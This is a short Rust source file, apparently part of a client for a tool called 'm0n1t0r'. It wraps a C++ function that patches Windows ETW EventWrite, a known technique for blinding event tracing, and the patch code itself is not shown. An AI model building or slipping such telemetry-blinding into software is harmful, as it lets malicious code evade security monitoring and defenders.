use m0n1t0r_common::{Error, Result as AppResult};
use std::thread;
use tokio::sync::oneshot;

pub async fn patch_etw_event_write() -> AppResult<()> {
    let (tx, rx) = oneshot::channel();

    thread::spawn(move || {
        let _ = tx.send(ffi::patch_etw_event_write());
        Ok::<_, Error>(())
    });
    Ok(rx.await??)
}

#[cxx::bridge]
mod ffi {
    extern "Rust" {}

    unsafe extern "C++" {
        include!("m0n1t0r-client/m0n1t0r-cpp-windows-lib/include/blind.h");

        fn patch_etw_event_write() -> Result<()>;
    }
}
